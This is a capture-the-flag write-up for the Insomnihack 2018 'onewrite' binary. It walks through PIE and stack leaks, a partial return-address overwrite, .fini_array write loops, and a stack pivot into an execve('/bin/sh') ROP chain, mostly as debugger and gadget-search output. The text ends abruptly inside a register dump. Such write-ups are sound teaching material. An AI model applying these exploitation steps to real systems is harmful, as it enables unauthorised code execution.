# insomnihack 2018 onewrite

Let's take a look at the binary:

```
$    file onewrite
onewrite: ELF 64-bit LSB pie executable, x86-64, version 1 (GNU/Linux), dynamically linked, for GNU/Linux 3.2.0, with debug_info, not stripped
$    pwn checksec onewrite
[!] Did not find any GOT entries
[*] '/Hackery/pod/modules/stack_pivot/insomnihack18_onewrite/onewrite'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$    ./onewrite
All you need to pwn nowadays is a leak and a qword write they say...
What do you want to leak ?
1. stack
2. pie
 > 1
0x7ffe246ac1a0
address : 0x7ffe246ac1a0
data : 5
```

So we can see that we are dealing with a `64` bit binary with a Stack Canary, NX, and PIE. When we run it, it appears to give us a choice between a stack or PIE infoleak. After that, it looks like it gives us a write to a region of memory we specify.

## Reversing

When we take a look at the main function in Ghidra, we see this:

```
void main(void)

{
  setvbuf((FILE *)stdin,(char *)0x0,2,0);
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  puts("All you need to pwn nowadays is a leak and a qword write they say...");
  do_leak();
  return;
}
```

So we can see it prints some text, and calls `do_leak`:

```
void do_leak(void)

{
  long choice;
  undefined auStack24 [8];
  undefined *do_leak_adr;
 
  do_leak_adr = do_leak;
  puts("What do you want to leak ?");
  puts("1. stack");
  puts("2. pie");
  printf(" > ");
  choice = read_int();
  if (choice == 1) {
    printf("%p\n",auStack24);
  }
  else {
    if (choice == 2) {
      printf("%p\n",do_leak_adr);
    }
    else {
      puts("Nope");
    }
  }
  do_overwrite();
  return;
}
```

So we can see it prompts us for a choice. If we choose `1`, it will print the address of `auStack24` and give us a stack infoleak. If we choose `2`, it will print the address of the `do_leak` function and give us a PIE infoleak. So we essentially get a choice between either a PIE or a stack infoleak. Then it calls `do_overwrite`:

```
void do_overwrite(void)

{
  void *ptr;
 
  printf("address : ");
  ptr = (void *)read_int();
  printf("data : ");
  read(0,ptr,8);
  return;
}
```


Here we can see it prompts for an address with `read_int` and stores it in `ptr`. It then let's us write `8` bytes (a QWORD) to `ptr`. So essentially we have a single QWORD write to an address that we specify, with data that we control.

## Exploitation

So our exploit will have two parts. The first is we will use a partial overwrite to call the `do_leak` function multiple times, to get both a stack and PIE infoleaks. Then we will write to the `fini_array` to essentially give us as many writes as we want. Using that we will write our rop chain to memory. Proceeding that we will just call a gadget which will pivot the stack to execute our rop chain.

#### Infoleaks / Partial Overwrites

So for the first run through, we will choose the stack infoleak. Using this we will be able to know where the saved return address for `do_leak` is. Let's find the offset using pwntools and gdb:

We set a breakpoint for the `ret` instruction in `do_leak`:

```
Breakpoint 1, 0x00007f6814bc3ab7 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x1               
$rbx   : 0x00007f6814bc3060  →   sub rsp, 0x8
$rcx   : 0x0               
$rdx   : 0x8               
$rsp   : 0x00007ffe8c136818  →  0x00007f6814bc3b09  →   nop
$rbp   : 0x00007f6814bc4780  →   push r15
$rsi   : 0x00007ffe8c136800  →  0x00007f6814bc4704  →  0x2a9c3b3d894c002a ("*"?)
$rdi   : 0x0               
$rip   : 0x00007f6814bc3ab7  →   ret
$r8    : 0x00007f68152da880  →  0x00007f68152da880  →  [loop detected]
$r9    : 0x0               
$r10   : 0x00007f6814c49840  →   add BYTE PTR [rax], al
$r11   : 0x0000000000000246
$r12   : 0x00007f6814bc4810  →   push rbp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────── stack ────
0x00007ffe8c136818│+0x0000: 0x00007f6814bc3b09  →   nop    ← $rsp
0x00007ffe8c136820│+0x0008: 0x00007f6814bc3060  →   sub rsp, 0x8
0x00007ffe8c136828│+0x0010: 0x00007f6814bc4089  →   mov edi, eax
0x00007ffe8c136830│+0x0018: 0x0000000000000000
0x00007ffe8c136838│+0x0020: 0x0000000100000000
0x00007ffe8c136840│+0x0028: 0x00007ffe8c136948  →  0x00007ffe8c1373de  →  "./onewrite"
0x00007ffe8c136848│+0x0030: 0x00007f6814bc3ab8  →   sub rsp, 0x8
0x00007ffe8c136850│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f6814bc3aad                  call   0x7f6814bc39c3
   0x7f6814bc3ab2                  nop    
   0x7f6814bc3ab3                  add    rsp, 0x18
 → 0x7f6814bc3ab7                  ret    
   ↳  0x7f6814bc3b09                  nop    
      0x7f6814bc3b0a                  add    rsp, 0x8
      0x7f6814bc3b0e                  ret    
      0x7f6814bc3b0f                  nop    
      0x7f6814bc3b10                  push   rbx
      0x7f6814bc3b11                  sub    rsp, 0x88
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "onewrite", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f6814bc3ab7 → ret
[#1] 0x7f6814bc3b09 → nop
[#2] 0x7f6814bc3060 → sub rsp, 0x8
[#3] 0x7f6814bc4089 → mov edi, eax
────────────────────────────────────────────────────────────────────────────────
gef➤  i f
Stack level 0, frame at 0x7ffe8c136818:
 rip = 0x7f6814bc3ab7; saved rip = 0x7f6814bc3b09
 called by frame at 0x7ffe8c136828
 Arglist at 0x7ffe8c136810, args:
 Locals at 0x7ffe8c136810, Previous frame's sp is 0x7ffe8c136820
 Saved registers:
  rip at 0x7ffe8c136818
```

So we can see that the saved return address is stored at `0x7ffe8c136818` and points to `0x7f6814bc3b09`. That address corresponds to `0x00108b09` in `do_leak`. The address we leaked was `0x7ffe8c136800`. Then the offset to the saved return address for `do_leak` from the address we have leaked is `0x7ffe8c136818 - 0x7ffe8c136800 = 0x18`

```
        00108aff e8 5c 84        CALL       puts                                             int puts(char * __s)
                 00 00
        00108b04 e8 0c ff        CALL       do_leak                                          undefined do_leak()
                 ff ff
        00108b09 90              NOP
        00108b0a 48 83 c4 08     ADD        RSP,0x8
```

What we can do here is a partial overwrite. That is where we only overwrite only a part of the saved return instruction. Because PIE works by addressing all instructions to an address and adding that to whatever the base instruction is, we can overwrite the last byte of the instruction address which will let us jump within a certain range around the original address, without having to use an infoleak or brute force the address. This can work since most of the time the base address for PIE ends in a null byte (which we can see here):

```
gef➤  vmmap
Start              End                Offset             Perm Path
0x00007f6814bbb000 0x00007f6814c69000 0x0000000000000000 r-x /Hackery/pod/modules/stack_pivot/insomnihack18_onewrite/onewrite
0x00007f6814e68000 0x00007f6814e6f000 0x00000000000ad000 rw- /Hackery/pod/modules/stack_pivot/insomnihack18_onewrite/onewrite
0x00007f6814e6f000 0x00007f6814e70000 0x0000000000000000 rw-
0x00007f68152da000 0x00007f68152fd000 0x0000000000000000 rw- [heap]
0x00007ffe8c117000 0x00007ffe8c138000 0x0000000000000000 rw- [stack]
0x00007ffe8c1ee000 0x00007ffe8c1f1000 0x0000000000000000 r-- [vvar]
0x00007ffe8c1f1000 0x00007ffe8c1f2000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```

So we will overwrite the least significant byte of the return address to be `0x04` in stead of `0x09`. This way it will point to the `CALL       do_leak ` instruction, so when it returns it will call `do_leak` again and we can choose the `PIE` infoleak. With that, we will have both a stack and a PIE infoleak.


#### Fini array / Writing ROP Chain

So we are able to call `do_leak` again, however it takes our QWORD write each time we do it, so past the initial infoleaks it doesn't serve much of a purpose past that. We will write a hook to the `_fini_array` table, that contains a list of functions which will be called when the program ends. That way we can have the program call `do_overwrite` when it exits. Also since after a function is ran, it moves on to the next entry, we will need to write at least two entries for the `do_overwrite` address to the `_fini_array`. We can see that it is `0x10` bytes large, which will work for this:

```
gef➤  info files
Symbols from "/Hackery/pod/modules/stack_pivot/insomnihack18_onewrite/onewrite".
Native process:
  Using the running image of child process 6946.
  While running this, GDB does not access memory from...
Local exec file:
  `/Hackery/pod/modules/stack_pivot/insomnihack18_onewrite/onewrite', file type elf64-x86-64.
  Entry point: 0x7ffff7d528b0
  0x00007ffff7d4a200 - 0x00007ffff7d4a220 is .note.ABI-tag
  0x00007ffff7d4a220 - 0x00007ffff7d4a23c is .gnu.hash
  0x00007ffff7d4a240 - 0x00007ffff7d4a258 is .dynsym
  0x00007ffff7d4a258 - 0x00007ffff7d4a259 is .dynstr
  0x00007ffff7d4a260 - 0x00007ffff7d51e38 is .rela.dyn
  0x00007ffff7d51e38 - 0x00007ffff7d52060 is .rela.plt
  0x00007ffff7d52060 - 0x00007ffff7d52077 is .init
  0x00007ffff7d52080 - 0x00007ffff7d52280 is .plt
  0x00007ffff7d52280 - 0x00007ffff7d522e0 is .plt.got
  0x00007ffff7d522e0 - 0x00007ffff7dd11a0 is .text
  0x00007ffff7dd11a0 - 0x00007ffff7dd1f6c is __libc_freeres_fn
  0x00007ffff7dd1f70 - 0x00007ffff7dd208b is __libc_thread_freeres_fn
  0x00007ffff7dd208c - 0x00007ffff7dd2095 is .fini
  0x00007ffff7dd20a0 - 0x00007ffff7deb25c is .rodata
  0x00007ffff7deb25c - 0x00007ffff7dece98 is .eh_frame_hdr
  0x00007ffff7dece98 - 0x00007ffff7df73bc is .eh_frame
  0x00007ffff7df73bc - 0x00007ffff7df746b is .gcc_except_table
  0x00007ffff7ff7f80 - 0x00007ffff7ff7fa0 is .tdata
  0x00007ffff7ff7fa0 - 0x00007ffff7ff7fd0 is .tbss
  0x00007ffff7ff7fa0 - 0x00007ffff7ff7fb0 is .init_array
  0x00007ffff7ff7fb0 - 0x00007ffff7ff7fc0 is .fini_array
  0x00007ffff7ff7fc0 - 0x00007ffff7ffad54 is .data.rel.ro
  0x00007ffff7ffad58 - 0x00007ffff7ffaef8 is .dynamic
  0x00007ffff7ffaef8 - 0x00007ffff7ffaff0 is .got
  0x00007ffff7ffb000 - 0x00007ffff7ffb110 is .got.plt
  0x00007ffff7ffb120 - 0x00007ffff7ffcbf0 is .data
  0x00007ffff7ffcbf0 - 0x00007ffff7ffcc38 is __libc_subfreeres
  0x00007ffff7ffcc40 - 0x00007ffff7ffd2e8 is __libc_IO_vtables
  0x00007ffff7ffd2e8 - 0x00007ffff7ffd2f0 is __libc_atexit
  0x00007ffff7ffd2f0 - 0x00007ffff7ffd2f8 is __libc_thread_subfreeres
  0x00007ffff7ffd300 - 0x00007ffff7ffe9b8 is .bss
  0x00007ffff7ffe9b8 - 0x00007ffff7ffe9e0 is __libc_freeres_ptrs
  0x00007ffff7ff6120 - 0x00007ffff7ff615c is .hash in system-supplied DSO at 0x7ffff7ff6000
  0x00007ffff7ff6160 - 0x00007ffff7ff61a8 is .gnu.hash in system-supplied DSO at 0x7ffff7ff6000
  0x00007ffff7ff61a8 - 0x00007ffff7ff6298 is .dynsym in system-supplied DSO at 0x7ffff7ff6000
  0x00007ffff7ff6298 - 0x00007ffff7ff62f6 is .dynstr in system-supplied DSO at 0x7ffff7ff6000
  0x00007ffff7ff62f6 - 0x00007ffff7ff630a is .gnu.version in system-supplied DSO at 0x7ffff7ff6000
  0x00007ffff7ff6310 - 0x00007ffff7ff6348 is .gnu.version_d in system-supplied DSO at 0x7ffff7ff6000
  0x00007ffff7ff6348 - 0x00007ffff7ff6468 is .dynamic in system-supplied DSO at 0x7ffff7ff6000
  0x00007ffff7ff6468 - 0x00007ffff7ff64bc is .note in system-supplied DSO at 0x7ffff7ff6000
  0x00007ffff7ff64bc - 0x00007ffff7ff64f0 is .eh_frame_hdr in system-supplied DSO at 0x7ffff7ff6000
  0x00007ffff7ff64f0 - 0x00007ffff7ff65e0 is .eh_frame in system-supplied DSO at 0x7ffff7ff6000
  0x00007ffff7ff65e0 - 0x00007ffff7ff688a is .text in system-supplied DSO at 0x7ffff7ff6000
  0x00007ffff7ff688a - 0x00007ffff7ff68e5 is .altinstructions in system-supplied DSO at 0x7ffff7ff6000
  0x00007ffff7ff68e5 - 0x00007ffff7ff68fb is .altinstr_replacement in system-supplied DSO at 0x7ffff7ff6000
gef➤  vmmap
Start              End                Offset             Perm Path
0x00007ffff7d4a000 0x00007ffff7df8000 0x0000000000000000 r-x /Hackery/pod/modules/stack_pivot/insomnihack18_onewrite/onewrite
0x00007ffff7ff3000 0x00007ffff7ff6000 0x0000000000000000 r-- [vvar]
0x00007ffff7ff6000 0x00007ffff7ff7000 0x0000000000000000 r-x [vdso]
0x00007ffff7ff7000 0x00007ffff7ffe000 0x00000000000ad000 rw- /Hackery/pod/modules/stack_pivot/insomnihack18_onewrite/onewrite
0x00007ffff7ffe000 0x00007ffff8022000 0x0000000000000000 rw- [heap]
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```

So we can see that the `.fini_array` is between `0x00007ffff7ff7fb0 - 0x00007ffff7ff7fc0` which gives us `0x10` bytes to work with. This will work for what we need to do. Also we can see it is mapped to a PIE region of memory between `0x00007ffff7ff7000 - 0x00007ffff7ffe000`, so using our infoleaks we know where `.fini_array` is.

So we will have two entries in the `.fini_array` that will give us two separate QWORD writes. We will use the first one to write what address we want, where we want it. The second write we will use to write the address of `__libc_csu_fini` (located at PIE offset `0x9810`) to the saved return address for `__libc_csu_fini`. Since `__libc_csu_fini`  is responsible for calling the functions in the `.fini_array`. So calling it will give us another run through the `.fini_array` entries.

Also since entries from the `.fini_array` are called in reverse order, we will want to write to the second entry first. Then we will write to the first entry, and when it is executed we will be able to restart the loop.

Also one more thing. Each time we call `__libc_csu_fini`, due to how the memory works the saved return address will shift the address that we use for `__libc_csu_fini` on the stack up by `0x8`. We can find the offset for it's return address the usual way (see where the return address is stored, and calculate the offset from our infoleak).

For the ROP gadget, turns out the binary has all of the gadgets needed to pop a shell. So we won't be needing to use gadgets from libc.

A lot of the output from these commands were omitted for the sake of making it look readable:
```
$ python ROPgadget.py --binary onewrite | grep "pop rdi"
0x00000000000084fa : pop rdi ; ret
$ python ROPgadget.py --binary onewrite | grep "pop rsi"
0x000000000000d9f2 : pop rsi ; ret
$ python ROPgadget.py --binary onewrite | grep "pop rdx"
0x00000000000484c5 : pop rdx ; ret
$ python ROPgadget.py --binary onewrite | grep "pop rax"
0x00000000000460ac : pop rax ; ret
$ python ROPgadget.py --binary onewrite | grep "syscall"
0x0000000000073baf : syscall
$ python ROPgadget.py --binary onewrite | grep "add rsp"
```

The `add rsp` gadget at the end we will cover later. However we can see that we have all of the gadgets we need to make an `execve` syscall from just using gadgets from the `PIE` section of memory. For writing the string `/bin/sh\x00` we can just use the QWORD write loop to write that to memory. Looking through the memory, we find a place that might work to write `/bin/sh` in the bss:

```
gef➤  vmmap
Start              End                Offset             Perm Path
0x00007fd53eb27000 0x00007fd53ebd5000 0x0000000000000000 r-x /Hackery/pod/modules/stack_pivot/insomnihack18_onewrite/onewrite
0x00007fd53edd4000 0x00007fd53eddb000 0x00000000000ad000 rw- /Hackery/pod/modules/stack_pivot/insomnihack18_onewrite/onewrite
0x00007fd53eddb000 0x00007fd53eddc000 0x0000000000000000 rw-
0x00007fd53f879000 0x00007fd53f89c000 0x0000000000000000 rw- [heap]
0x00007ffee6f8d000 0x00007ffee6fae000 0x0000000000000000 rw- [stack]
0x00007ffee6fd6000 0x00007ffee6fd9000 0x0000000000000000 r-- [vvar]
0x00007ffee6fd9000 0x00007ffee6fda000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  info files
Symbols from "/Hackery/pod/modules/stack_pivot/insomnihack18_onewrite/onewrite".
Native process:
  Using the running image of attached process 8583.
  While running this, GDB does not access memory from...
Local exec file:
  `/Hackery/pod/modules/stack_pivot/insomnihack18_onewrite/onewrite', file type elf64-x86-64.
  Entry point: 0x88b0
  0x00007ffee6fd9120 - 0x00007ffee6fd915c is .hash in system-supplied DSO at 0x7ffee6fd9000
  0x00007ffee6fd9160 - 0x00007ffee6fd91a8 is .gnu.hash in system-supplied DSO at 0x7ffee6fd9000
  0x00007ffee6fd91a8 - 0x00007ffee6fd9298 is .dynsym in system-supplied DSO at 0x7ffee6fd9000
  0x00007ffee6fd9298 - 0x00007ffee6fd92f6 is .dynstr in system-supplied DSO at 0x7ffee6fd9000
  0x00007ffee6fd92f6 - 0x00007ffee6fd930a is .gnu.version in system-supplied DSO at 0x7ffee6fd9000
  0x00007ffee6fd9310 - 0x00007ffee6fd9348 is .gnu.version_d in system-supplied DSO at 0x7ffee6fd9000
  0x00007ffee6fd9348 - 0x00007ffee6fd9468 is .dynamic in system-supplied DSO at 0x7ffee6fd9000
  0x00007ffee6fd9468 - 0x00007ffee6fd94bc is .note in system-supplied DSO at 0x7ffee6fd9000
  0x00007ffee6fd94bc - 0x00007ffee6fd94f0 is .eh_frame_hdr in system-supplied DSO at 0x7ffee6fd9000
  0x00007ffee6fd94f0 - 0x00007ffee6fd95e0 is .eh_frame in system-supplied DSO at 0x7ffee6fd9000
  0x00007ffee6fd95e0 - 0x00007ffee6fd988a is .text in system-supplied DSO at 0x7ffee6fd9000
  0x00007ffee6fd988a - 0x00007ffee6fd98e5 is .altinstructions in system-supplied DSO at 0x7ffee6fd9000
  0x00007ffee6fd98e5 - 0x00007ffee6fd98fb is .altinstr_replacement in system-supplied DSO at 0x7ffee6fd9000
  0x0000000000000200 - 0x0000000000000220 is .note.ABI-tag
  0x0000000000000220 - 0x000000000000023c is .gnu.hash
  0x0000000000000240 - 0x0000000000000258 is .dynsym
  0x0000000000000258 - 0x0000000000000259 is .dynstr
  0x0000000000000260 - 0x0000000000007e38 is .rela.dyn
  0x0000000000007e38 - 0x0000000000008060 is .rela.plt
  0x0000000000008060 - 0x0000000000008077 is .init
  0x0000000000008080 - 0x0000000000008280 is .plt
  0x0000000000008280 - 0x00000000000082e0 is .plt.got
  0x00000000000082e0 - 0x00000000000871a0 is .text
  0x00000000000871a0 - 0x0000000000087f6c is __libc_freeres_fn
  0x0000000000087f70 - 0x000000000008808b is __libc_thread_freeres_fn
  0x000000000008808c - 0x0000000000088095 is .fini
  0x00000000000880a0 - 0x00000000000a125c is .rodata
  0x00000000000a125c - 0x00000000000a2e98 is .eh_frame_hdr
  0x00000000000a2e98 - 0x00000000000ad3bc is .eh_frame
  0x00000000000ad3bc - 0x00000000000ad46b is .gcc_except_table
  0x00000000002adf80 - 0x00000000002adfa0 is .tdata
  0x00000000002adfa0 - 0x00000000002adfd0 is .tbss
  0x00000000002adfa0 - 0x00000000002adfb0 is .init_array
  0x00000000002adfb0 - 0x00000000002adfc0 is .fini_array
  0x00000000002adfc0 - 0x00000000002b0d54 is .data.rel.ro
  0x00000000002b0d58 - 0x00000000002b0ef8 is .dynamic
  0x00000000002b0ef8 - 0x00000000002b0ff0 is .got
  0x00000000002b1000 - 0x00000000002b1110 is .got.plt
  0x00000000002b1120 - 0x00000000002b2bf0 is .data
  0x00000000002b2bf0 - 0x00000000002b2c38 is __libc_subfreeres
  0x00000000002b2c40 - 0x00000000002b32e8 is __libc_IO_vtables
  0x00000000002b32e8 - 0x00000000002b32f0 is __libc_atexit
  0x00000000002b32f0 - 0x00000000002b32f8 is __libc_thread_subfreeres
  0x00000000002b3300 - 0x00000000002b49b8 is .bss
  0x00000000002b49b8 - 0x00000000002b49e0 is __libc_freeres_ptrs
```

So we can see that the bss starts at `0x00000000002b3300 + 0x00007fd53eb27000 = 0x7fd53edda300`

`0x7f8be09a60f0 - 0x7f8be0700a15 = 0x2a56db`

```
gef➤  x/50g 0x7fd53edda300
0x7fd53edda300: 0x0 0x0
0x7fd53edda310: 0x0 0x0
0x7fd53edda320: 0x40  0x0
0x7fd53edda330: 0x0 0x0
0x7fd53edda340: 0x0 0x7fd53edd9320
0x7fd53edda350: 0x0 0x0
0x7fd53edda360: 0x0 0x0
0x7fd53edda370: 0x0 0x0
0x7fd53edda380: 0x0 0x0
0x7fd53edda390: 0x0 0x0
0x7fd53edda3a0: 0x0 0x0
0x7fd53edda3b0: 0x0 0x0
0x7fd53edda3c0: 0x0 0x0
0x7fd53edda3d0: 0x0 0x0
0x7fd53edda3e0: 0x0 0x0
0x7fd53edda3f0: 0x0 0x0
0x7fd53edda400: 0x0 0x0
0x7fd53edda410: 0x0 0x0
0x7fd53edda420: 0x0 0x0
0x7fd53edda430: 0x0 0x0
0x7fd53edda440: 0x0 0x0
0x7fd53edda450: 0x0 0x0
0x7fd53edda460: 0x0 0x0
0x7fd53edda470: 0x0 0x0
0x7fd53edda480: 0x0 0x0
```

So we can see there is a lot of blank space here for us to use. I choose `0x7fd53edda3b0` randomly. Calculating the offset from the leaked pie address, we see that the offset is `0x2aa99b`.

#### Stack Pivot

The last thing we will need to know is where to store our rop chain. This will directly deal with our stack pivot.

The stack pivot attack here will work when `do_overwrite` returns. We can see that when a function returns (calls `ret` instruction), the `rsp` register (which points to the top of the stack) points to the instruction address which will be executed:

```
───────────────────────────────────────────────────────────────────── stack ────
0x00007ffce47b3838│+0x0000: 0x00007f8889c49ab2  →   nop    ← $rsp
0x00007ffce47b3840│+0x0008: 0x00007f8889c4a780  →   push r15
0x00007ffce47b3848│+0x0010: 0x00007f8889c49a15  →   sub rsp, 0x18
0x00007ffce47b3850│+0x0018: 0x0000000000000000
0x00007ffce47b3858│+0x0020: 0x00007f8889c49b04  →   call 0x7f8889c49a15  ← $rsi
0x00007ffce47b3860│+0x0028: 0x00007f8889c49060  →   sub rsp, 0x8
0x00007ffce47b3868│+0x0030: 0x00007f8889c4a089  →   mov edi, eax
0x00007ffce47b3870│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f8889c49a0a                  call   0x7f8889c870f0
   0x7f8889c49a0f                  nop    
   0x7f8889c49a10                  add    rsp, 0x18
 → 0x7f8889c49a14                  ret    
   ↳  0x7f8889c49ab2                  nop    
      0x7f8889c49ab3                  add    rsp, 0x18
      0x7f8889c49ab7                  ret    
      0x7f8889c49ab8                  sub    rsp, 0x8
      0x7f8889c49abc                  mov    rax, QWORD PTR [rip+0x2a8d25]        # 0x7f8889ef27e8
      0x7f8889c49ac3                  mov    ecx, 0x0
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "onewrite", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f8889c49a14 → ret
[#1] 0x7f8889c49ab2 → nop
[#2] 0x7f8889c4a780 → push r15
[#3] 0x7f8889c49a15 → sub rsp, 0x18
────────────────────────────────────────────────────────────────────────────────
gef➤  p $rsp
$1 = (void *) 0x7ffce47b3838
gef➤  x/g $rsp
0x7ffce47b3838: 0x7f8889c49ab2
gef➤  x/3i 0x7f8889c49ab2
   0x7f8889c49ab2:  nop
   0x7f8889c49ab3:  add    rsp,0x18
   0x7f8889c49ab7:  ret    
```

So how our stack pivot will work, we will add a value to the `rsp` register, which will shift where it returns. We will just shift it up so it starts executing our rop chain, which we can store further up the stack. To find the exact offset, we can just see where the stack pivot will pivot us to, and just store the rop chain at that offset. We can see how our gadget shifts it:

First we add `0xd0` to the `rsp`:
```
Breakpoint 1, 0x00007f3bdb37d6f3 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x8               
$rbx   : 0x1               
$rcx   : 0x0               
$rdx   : 0x8               
$rsp   : 0x00007ffd5f925f68  →  0x0000000000000001
$rbp   : 0x00007f3bdb61afb0  →  0x00007f3bdb3759c3  →   sub rsp, 0x18
$rsi   : 0x00007ffd5f925f60  →  0x00007f3bdb37d6f3  →   add rsp, 0xd0
$rdi   : 0x0               
$rip   : 0x00007f3bdb37d6f3  →   add rsp, 0xd0
$r8    : 0x00007f3bdd24e880  →  0x00007f3bdd24e880  →  [loop detected]
$r9    : 0x0               
$r10   : 0x00007f3bdb3fb840  →   add BYTE PTR [rax], al
$r11   : 0x0000000000000246
$r12   : 0x00007f3bdb61e140  →  0x00007f3bdb6208c0  →  0x0000000000000000
$r13   : 0x1               
$r14   : 0x00007f3bdb6208c0  →  0x0000000000000000
$r15   : 0x1               
$eflags: [zero carry PARITY ADJUST sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────── stack ────
0x00007ffd5f925f68│+0x0000: 0x0000000000000001   ← $rsp
0x00007ffd5f925f70│+0x0008: 0x0000000000000001
0x00007ffd5f925f78│+0x0010: 0x0000000000000008
0x00007ffd5f925f80│+0x0018: 0x0000000000000000
0x00007ffd5f925f88│+0x0020: 0xd4842db0baa9bc00
0x00007ffd5f925f90│+0x0028: 0x00007f3bdb375060  →   sub rsp, 0x8
0x00007ffd5f925f98│+0x0030: 0x00007f3bdb376090  →   cmp ebx, 0x68747541
0x00007ffd5f925fa0│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f3bdb37d6e6                  xor    rcx, QWORD PTR fs:0x28
   0x7f3bdb37d6ef                  mov    eax, edx
   0x7f3bdb37d6f1                  jne    0x7f3bdb37d6fc
 → 0x7f3bdb37d6f3                  add    rsp, 0xd0
   0x7f3bdb37d6fa                  pop    rbx
   0x7f3bdb37d6fb                  ret    
   0x7f3bdb37d6fc                  call   0x7f3bdb3b55d0
   0x7f3bdb37d701                  nop    DWORD PTR [rax+rax*1+0x0]
   0x7f3bdb37d706                  nop    WORD PTR cs:[rax+rax*1+0x0]
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "onewrite", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f3bdb37d6f3 → add rsp, 0xd0
────────────────────────────────────────────────────────────────────────────────
gef➤  p $rsp
$1 = (void *) 0x7ffd5f925f68
```

We can see that it has been shifted up by `0xd0`:
```
Breakpoint 2, 0x00007f3bdb37d6fa in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x8               
$rbx   : 0x1               
$rcx   : 0x0               
$rdx   : 0x8               
$rsp   : 0x00007ffd5f926038  →  0xdb5d522c6f2f9d53
$rbp   : 0x00007f3bdb61afb0  →  0x00007f3bdb3759c3  →   sub rsp, 0x18
$rsi   : 0x00007ffd5f925f60  →  0x00007f3bdb37d6f3  →   add rsp, 0xd0
$rdi   : 0x0               
$rip   : 0x00007f3bdb37d6fa  →   pop rbx
$r8    : 0x00007f3bdd24e880  →  0x00007f3bdd24e880  →  [loop detected]
$r9    : 0x0               
$r10   : 0x00007f3bdb3fb840  →   add BYTE PTR [rax], al
$r11   : 0x0000000000000246
$r12   : 0x00007f3bdb61e140  →  0x00007f3bdb6208c0  →  0x0000000000000000
$r13   : 0x1               
$r14   : 0x00007f3bdb6208c0  →  0x0000000000000000
$r15   : 0x1               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────── stack ────
0x00007ffd5f926038│+0x0000: 0xdb5d522c6f2f9d53   ← $rsp
0x00007ffd5f926040│+0x0008: 0x00007f3bdb3754fa  →   pop rdi
0x00007ffd5f926048│+0x0010: 0x00007f3bdb6203b0  →  0x0068732f6e69622f ("/bin/sh"?)
0x00007ffd5f926050│+0x0018: 0x00007f3bdb37a9f2  →   pop rsi
0x00007ffd5f926058│+0x0020: 0x0000000000000000
0x00007ffd5f926060│+0x0028: 0x00007f3bdb3b54c5  →   pop rdx
0x00007ffd5f926068│+0x0030: 0x0000000000000000
0x00007ffd5f926070│+0x0038: 0x00007f3bdb3b30ac  →   pop rax
─────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f3bdb37d6ec                  add    BYTE PTR [rax], al
   0x7f3bdb37d6ee                  add    BYTE PTR [rcx+0x480975d0], cl
   0x7f3bdb37d6f4                  add    esp, 0xd0
 → 0x7f3bdb37d6fa                  pop    rbx
   0x7f3bdb37d6fb                  ret    
   0x7f3bdb37d6fc                  call   0x7f3bdb3b55d0
   0x7f3bdb37d701                  nop    DWORD PTR [rax+rax*1+0x0]
   0x7f3bdb37d706                  nop    WORD PTR cs:[rax+rax*1+0x0]
   0x7f3bdb37d710                  push   rbp
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "onewrite", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f3bdb37d6fa → pop rbx
────────────────────────────────────────────────────────────────────────────────
gef➤  p $rsp
$2 = (void *) 0x7ffd5f926038
```

Lastly we can see that we popped `rbx` which will increment the stack pointer (stack grows down):
```
Breakpoint 3, 0x00007f3bdb37d6fb in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x8               
$rbx   : 0xdb5d522c6f2f9d53
$rcx   : 0x0               
$rdx   : 0x8               
$rsp   : 0x00007ffd5f926040  →  0x00007f3bdb3754fa  →   pop rdi
$rbp   : 0x00007f3bdb61afb0  →  0x00007f3bdb3759c3  →   sub rsp, 0x18
$rsi   : 0x00007ffd5f925f60  →  0x00007f3bdb37d6f3  →   add rsp, 0xd0
$rdi   : 0x0               
$rip   : 0x00007f3bdb37d6fb  →   ret
$r8    : 0x00007f3bdd24e880  →  0x00007f3bdd24e880  →  [loop detected]
$r9    : 0x0               
$r10   : 0x00007f3bdb3fb840  →   add BYTE PTR [rax], al
